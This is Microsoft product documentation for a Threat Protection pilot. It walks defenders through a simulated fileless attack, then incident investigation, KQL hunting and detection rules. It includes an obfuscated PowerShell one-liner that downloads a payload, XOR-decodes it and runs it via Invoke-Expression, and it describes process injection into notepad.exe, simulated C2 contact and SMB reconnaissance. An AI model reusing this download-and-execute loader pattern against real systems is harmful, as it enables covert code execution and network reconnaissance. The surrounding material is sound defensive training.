---
title: Run your Microsoft Threat Protection attack simulations 
description: Run your pilot Microsoft Threat Protection project to effectively determine the benefit and adoption of Microsoft Threat Protection (MTP)
keywords: Microsoft Threat Protection pilot, run pilot Microsoft Threat Protection project, evaluate Microsoft Threat Protection in production, Microsoft Threat Protection pilot project, cyber security, advanced persistent threat, enterprise security, devices, device, identity, users, data, applications, incidents, automated investigation and remediation, advanced hunting
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: microsoft-365-enterprise
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection: M365-security-compliance 
ms.topic: conceptual
---

# Run your Microsoft Threat Protection attack simulations  

**Applies to:**
- Microsoft Threat Protection

To test the Microsoft Threat Protection capabilities for your pilot project, we will simulate a sophisticated attack that leverages advanced techniques to hide from detection. The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users’ devices. This category of attacks usually doesn’t include files dropped on the victim’s device—they occur solely in memory. They “live off the land” by using existing system and administrative tools and inject their code into system processes to hide their execution, allowing them to evade detection and persist on the device.

In this simulation, our sample scenario starts with a PowerShell script. A user might be tricked into running a script. Or the script might run from a remote connection to another computer from a previously infected device—the attacker attempting to move laterally in the network. Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.

During the simulation, the attack injects shellcode into a seemingly innocent process. In this scenario, we’ll use notepad.exe. We chose this process for the simulation, but attackers will more likely target a long-running system process, such as svchost.exe. The shellcode then goes on to contact the attacker’s command-and-control (C2) server to receive instructions on how to proceed. In addition, the script attempts executing reconnaissance queries against the domain controller (DC). This allows an attacker to get information about recent user login information. Once attackers have this information, they can move laterally in the network to get to a specific sensitive account


>[!IMPORTANT]
>For optimum results, follow the attack simulation instructions as closely as possible.


## Test environment requirements

There are two devices used in this scenario: a test device and a domain controller.

1.	Verify your tenant has [Protection](https://docs.microsoft.com/en-us/microsoft-365/security/mtp/mtp-enable#starting-the-service)￼￼ .
2.	Configure a test domain controller:
    - Set up a device with Windows Server 2008 R2 or a later version.
    - Onboard the test domain controller to [Azure Advanced Threat Protection](https://docs.microsoft.com/en-us/azure/security-center/security-center-wdatp) and enable [remote management](https://docs.microsoft.com/en-us/windows-server/administration/server-manager/configure-remote-management-in-server-manager).    
    - Enable [Azure ATP and Microsoft Cloud App Security integration](https://docs.microsoft.com/en-us/cloud-app-security/aatp-integration).
    - Create a test user on your domain – no admin permissions needed.

3.	Configure a test device:
    <br>
    a.	Requires Windows 10 version 1903 or a later version.
    <br>
    b.	Join the test device to the test domain.
    <br>
    c.	[Turn on Windows Defender Antivirus](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).
    <br>
    d.	[Onboard to Microsoft Defender Advanced Threat Protection (MDATP)](https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

If you use an existing tenant and implement device groups, create a dedicated device group for the test device and push it to top level in configuration UX.


## Run the simulation

To run the attack scenario simulation:

1.	Log in to the test device with the test user account.

2.	Open a Windows PowerShell window on the test device.

3.	Copy the following simulation script:
```
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
= [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
-UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
$decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
$i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
```
>[!NOTE]
>If you open this document on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks. Download this document and open it on Adobe Reader.

4. At the prompt, paste and run the copied script.

>[!NOTE]
>If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the **CTRL-V** hotkey or right-click-paste method might not work.  Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.

A few seconds later, notepad.exe will open. A simulated attack code will be injected into notepad.exe. Keep the automatically generated Notepad instance open to experience the full scenario.

The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller via SMB.

You will see a message displayed on the PowerShell console when this script completes.

```
ran NetSessionEnum against [DC Name] with return code result 0      
```

To see the Automated Incident and Response feature in action, keep the notepad.exe process open. You will see Automated Incident and Response stop the Notepad process.


## Investigate an incident

Switching to the SOC analyst point of view, you can now start to investigate the attack in the Microsoft Threat Protection portal. 

>[!NOTE]
>Before we walk you through this simulation, watch [this video](https://www.youtube.com/watch?v=Vfuf7KXXo5E) to see how incident management helps you piece the related alerts together, where you can find it in the portal, and how it can help you in your security operations.

1.	Open the [Microsoft Threat Protection portal](https://security.microsoft.com/incidents) incident queue from any device.

2.	Navigate to Incidents from the menu. 

![Screenshot of incidents as shown on the Microsoft 365 Security Center’s left-hand side menu](../../media/mtp-pilot/fig1.png)

3.	The new incident for the simulated attack will appear in the incident queue.
 
![Screenshot of the incident queue](../../media/mtp-pilot/fig2.png)


### Investigate the attack as a single incident

Microsoft Threat Protection correlates analytics and aggregates all related alerts and investigations from different products into one incident entity. By doing so, Microsoft Threat Protection shows a broader attack story, allowing the SOC analyst to understand and respond to complex threats.

The alerts generated during this simulation are associated with the same threat, and as a result, are automatically aggregated as a single incident.

To view the incident:

1.	Navigate to the Incidents queue.
 
![Screenshot of incidents from the navigation menu](../../media/mtp-pilot/fig1.png)

2.	Select the newest item by clicking on the circle located left of the incident name. A side panel displays additional information about the incident, including all the related alerts. Each incident has a unique name that describes it based on the attributes of the alerts it includes.

![Screenshot of the incidents page where generated alerts are aggregated during the simulation](../../media/mtp-pilot/fig4.png)

The alerts that shows in the dashboard can be filtered based on service resources: Azure ATP, Microsoft Cloud App Security, Microsoft Defender ATP, Microsoft Threat Protection, and Office ATP.  

3.	Select **Open incident page** to get more information about the incident.

<br>In the **Incident** page, you can see all the alerts and information related to the incident. This includes the entities and assets that are involved in the alert, the detection source of the alerts (Azure ATP, EDR), and the reason they were linked together. Reviewing the incident alert list shows the progression of the attack. From this view, you can see and investigate the individual alerts.

<br>You can also click **Manage incident** from the right-hand menu, to tag the incident, assign it to yourself, and add comments.
<br>  
![Screenshot of where to click Manage incident](../../media/mtp-pilot/fig5a.png)
<br>
![Screenshot of the fields on the manage incident panel where you can tag the incident, assign it to yourself, and add comments ](../../media/mtp-pilot/fig5a.png)


### Review generated alerts 

Let’s look at some of the alerts generated during the simulated attack.
NOTE: We’ll walk through only a few of the alerts generated during the simulated attack. Depending on the version of Windows and the Microsoft Threat Protection products running on your test device, you might see more alerts that appear in a slightly different order.

![Screenshot of generated alerts](../../media/mtp-pilot/fig6.png) 


**Alert: Suspicious process injection observed (Source: Microsoft Defender ATP EDR)**
Advanced attackers use sophisticated and stealthy methods to persist in memory and hide from detection tools. One common technique is to operate from within a trusted system process rather than a malicious executable, making it hard for detection tools and security operations to spot the malicious code.

To allow the SOC analysts to catch these advanced attacks, deep memory sensors in Microsoft Defender ATP provide our cloud service with unprecedented visibility into a variety of cross-process code injection techniques. The following figure shows how Microsoft Defender ATP detected and alerted on the attempt to inject code to <i>notepad.exe</i>.

![Screenshot of the alert for injection of potentially malicious code](../../media/mtp-pilot/fig7.png) 


**Alert: Unexpected behavior observed by a process run with no command line arguments (Source: Microsoft Defender ATP EDR)**
Microsoft Defender ATP detections often target the most common attribute of an attack technique. This ensures durability and raises the bar for attackers to switch to newer tactics.

We employ large-scale learning algorithms to establish the normal behavior of common processes within an organization and worldwide and watch for when these processes exhibit anomalous behaviors. These anomalous behaviors often indicate that extraneous code was introduced and is running in an otherwise trusted process.

For this scenario, the process <i>notepad.exe</i> is exhibiting abnormal behavior, involving communication with an external location. This outcome is independent of the specific method used to introduce and execute the malicious code.

>[!NOTE]
>Because this alert is based on machine-learning models that require additional backend processing, it might take some time before you see this alert in the portal.

Notice that the alert details include the external IP address—an indicator that you can use as a pivot to expand investigation.

Click the IP address in the alert process tree to view the IP address details page.

![Screenshot of the alert for unexpected behavior by a process run with no command line arguments](../../media/mtp-pilot/fig8.png) 

The following figure displays the selected IP Address details page (clicking on IP address in the Alert process tree).
![Screenshot of the IP address details page](../../media/mtp-pilot/fig9.png)


**Alert: User and IP address reconnaissance (SMB) (Source: Azure ATP)**
Enumeration using Server Message Block (SMB) protocol enables attackers to get recent user logon information that helps them move laterally through the network to access a specific sensitive account.
In this detection, an alert is triggered when the SMB session enumeration runs against a domain controller.

![Screenshot of the Azure ATP alert for User and IP address reconnaissance](../../media/mtp-pilot/fig10.png) 


**Review the device timeline [Microsoft Defender ATP]**
After exploring the various alerts in this incident, navigate back to the incident page you investigated earlier. Click the **Devices** tab in the incident page to review the devices involved in this incident as reported by Microsoft Defender ATP and Azure ATP.

Click the name of the device where the attack was conducted, to open the entity page for that specific device. In that page, you can see alerts that were triggered and related events.

Click the **Timeline** tab to open the device timeline and view all events and behaviors observed on the device in chronological order, interspersed with the alerts raised.

![Screenshot of the device timeline with behaviors](../../media/mtp-pilot/fig11.png) 

Expanding some of the more interesting behaviors provides useful details, such as process trees.

For example, scroll down until you find the alert event **Suspicious process injection observed**. Click the **powershell.exe injected to notepad.exe process** event below it, to display the full process tree for this behavior under the **Event entities** graph on the side pane. Use the search bar for filtering if necessary.

![Screenshot of the process tree for selected PowerShell file creation behavior](../../media/mtp-pilot/fig12.png)

## Resolve the incident

After the investigation is complete and confirmed to be remediated, close the incident.

Click **Manage incident**. Set the status to **Resolve incident** and select the relevant classification.

Once the incident is resolved, it will close all of the associated alerts in Microsoft Threat Protection and in the related portals.

![Screenshot of the incidents page with the open Manage incident panel where you can click the switch to resolve incident](../../media/mtp-pilot/fig17.png) 


## Advanced hunting scenario

>[!NOTE]
>Before we walk you through the simulation, watch [this video](https://www.microsoft.com/videoplayer/embed/RE4Bp7O) to understand the advanced hunting concepts, see where you can find it in the portal, and know how it can help you in your security operations.

### Test environment requirements
There is a single internal mailbox and device required for this scenario. You will also need an external email account to send the test message.

1.	Verify that your tenant has enabled [Microsoft Threat Protection](https://docs.microsoft.com/en-us/microsoft-365/security/mtp/mtp-enable?view=o365-worldwide#starting-the-service).
2.	Identify a target mailbox to be used for receiving email.
a.	This mailbox must be monitored by Office 365 ATP
b.	The device from requirement 3 needs to access this mailbox
3.	Configure a test device:
a.	Make sure you are using Windows 10 version 1903 or later version.
b.	Join the test device to the test domain.
c.	[Turn on Windows Defender Antivirus](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). If you are having trouble enabling Windows Defender Antivirus, see [this troubleshooting topic](https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).
d.	[Onboard to Microsoft Defender Advanced Threat Protection (MDATP)](https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

### Run the simulation
1.	From an external email account, send an email to the mailbox identified in step 2 of the test environment requirements section.  Include an attachment that will be allowed through any existing email filter policies.  This file does not need to be malicious or an executable.  Suggested file types are <i>.pdf</i>, <i>.exe</i> (if allowed), or Office document such as a Word file.
2.	Open the sent email from the device configured as defined in step 3 of the test environment requirements section. Either open the attachment or save the file to the device.


**Go hunting**
1.	Open the security.microsoft.com portal.
2.	Navigate to Hunting > Advanced hunting.

![Screenshot of advanced hunting in the M365 Security portal navigation bar](../../media/mtp-pilot/fig18.png) 

3.	Build a query that starts by gathering email events.
a.	From the query pane, select New.
b.	Double-click on the EmailEvents table from the schema.

```
EmailEvents 
```                                        

c.	Change the time frame to the last 24 hours. Assuming the email you sent when you ran the simulation above was in the past 24 hours, otherwise change the time frame.
![Screenshot of where you can change the time frame. Open the drop-down menu to choose from range of time frame options
](../../media/mtp-pilot/fig19.png) 


d.	Run the query.  You may have many results depending on the environment for the pilot.  

>[!NOTE]
>See the next step for filtering options to limit data return.

![Screenshot of the advanced hunting query results](../../media/mtp-pilot/fig20.png) 

>[!NOTE]
>Advanced hunting displays query results as tabular data. You can also opt to view the data in other format types such as charts.    

e.	Look at the results and see if you can identify the email you opened.  It may take up to 2 hours for the message to show up in advanced hunting. If the email environment is large and there are many results, you might want to use the Show Filters option to find the message. 

In the sample, the email was sent from a Yahoo account. Click the + icon beside yahoo.com under the SenderFromDomain section and then click Apply to add the selected domain to the query.  You should use the domain or email account that was used to send the test message in step 1 of Run the Simulation to filter your results.  Run the query again to get a smaller result set to verify that you see the message from the simulation.
![Screenshot of the filters. Use filters to narrow down the search, and find what you’re looking for faster.](../../media/mtp-pilot/fig21.png) 


```
EmailEvents 
| where SenderMailFromDomain == "yahoo.com"
```

f.	Click the resulting rows from the query so you can inspect the record.
![Screenshot of the inspect record panel which opens up when an advanced hunting result is selected](../../media/mtp-pilot/fig22.png) 


4.	Now that you have verified that you can see the email, add a filter for the attachments. Focus on all emails with attachments in the environment. For this scenario, focus on inbound emails, not those that are being sent out from your environment. Remove any filters you have added to locate your message and add “| where AttachmentCount > 0 and EmailDirection == “Inbound””

The following query will show you the result with a shorter list than your initial query for all email events:

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"

```

5.	Next, include the information about the attachment (such as: file name, hashes) to your result set. To do so, join the EmailAttachmentInfo table. The common fields to use for joining, in this case are NetworkMessageId and RecipientObjectId

The following query also includes an additional line “| project-rename EmailTimestamp=Timestamp” that will help identify which timestamp was related to the email versus timestamps related to file actions which you will add in the next step.

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"
| project-rename EmailTimestamp=Timestamp 
| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
```

6.	Next, use the SHA256 value from the EmailAttachmentInfo table to find DeviceFileEvents (file actions that happened on the endpoint) for that hash.  The common field here will be the SHA256 hash for the attachment.

The resulting table now includes details from the endpoint (Microsoft Defender ATP) such as device name, what action was done (in this case, filtered to only include FileCreated events), and where the file was stored. The account name associated with the process will also be included.

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"
| project-rename EmailTimestamp=Timestamp 
| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
| join DeviceFileEvents on SHA256 
| where ActionType == "FileCreated"
```

You have now created a query that will identify all inbound emails where the user opened or saved the attachment. You can also refine this query to filter for specific sender domains, file sizes, file types, and so on.

7.	Functions are a special sort of join which let you pull more TI data about a file like its prevalence, signer and issuer info, etc.  To get more details on the file, use the FileProfile() function enrichment:

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"
| project-rename EmailTimestamp=Timestamp 
| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
| join DeviceFileEvents on SHA256 
| where ActionType == "FileCreated"
| distinct SHA1
| invoke FileProfile()
```


**Create a detection**

Once you have created a query that identifies information that you would like to **get alerted** about if they happen in the future, you can create a custom detection from the query. 

Custom detections will run the query according to the frequency you set, and the results of the queries will create security alerts, based on the impacted assets you choose. Those alerts will be correlated to incidents and can be triaged as any other security alert generated by one of the products.

1.	On the query page, remove lines 7 and 8 that were added in step 7 of the Go hunting instructions and click **Create detection rule**. 

![Screenshot of where yoy can click create detection rule in the the advanced hunting page ](../../media/mtp-pilot/fig23.png) 

>[!NOTE]
>If you click **Create detection rule** and you have syntax errors in your query, your detection rule won’t be saved. Double-check your query to ensure there’s no errors. 


2.	Fill in the required fields with the  information that will allow the security team to understand the alert, why it was generated, and what actions you expect them to take. 

![Screenshot of the create detection rule page where you can define the alert details (../../media/mtp-pilot/fig24.png)

Ensure that you fill out the fields with clarity to help give the next user an informed decision about this detection rule alert 

3.	Select what entities are impacted in this alert. In this case, select the Device and the Mailbox.

![Screenshot of the create detection rule page where you can choose the parameters of the impacted entities](../../media/mtp-pilot/fig25.png)
 

4.	Determine what actions should take place if the alert is triggered. In this case, run an antivirus scan, though other actions could be taken. 

![Screenshot of the create detection rule page where you can run an antivirus scan when an alert is triggered to help address threats](../../media/mtp-pilot/fig26.png) 

5.	Select the scope for the alert rule. Since this query involve devices, the device groups are relevant in this custom detection according to Microsoft Defender ATP context.  When creating a custom detection that does not include devices as impacted entities, scope does not apply.  

![Screenshot of the create detection rule page where you can set the scope for the alert rule manages your expectations for the results that you’ll see](../../media/mtp-pilot/fig27.png) 

For this pilot, you might want to limit this rule to a subset of testing devices in your production environment.

6.	Select **Create**. Then, select **Custom detection rules** from the navigation panel.
 
![Screenshot of Custom detection rules option in the menu](../../media/mtp-pilot/fig28a.png) 

![Screenshot of the detection rules page which displays the rule and execution details
](../../media/mtp-pilot/fig28b.png) 

From this page, you can select the detection rule which will open a details page. 

![Screenshot of the email attachments page where you can see the status of the rule execution, triggered alerts and actions, edit the detection, and so on](../../media/mtp-pilot/fig29.png) 

## Next step
|||
|:-------|:-----|
|![Phase 4: Closing & summary](../../media/prepare.png) <br>[Phase 4: Closing & summary](prepare-mtpeval.md) | Analyze your Microsoft Threat Protection pilot outcome, present them to your stakeholders, and take the next step.
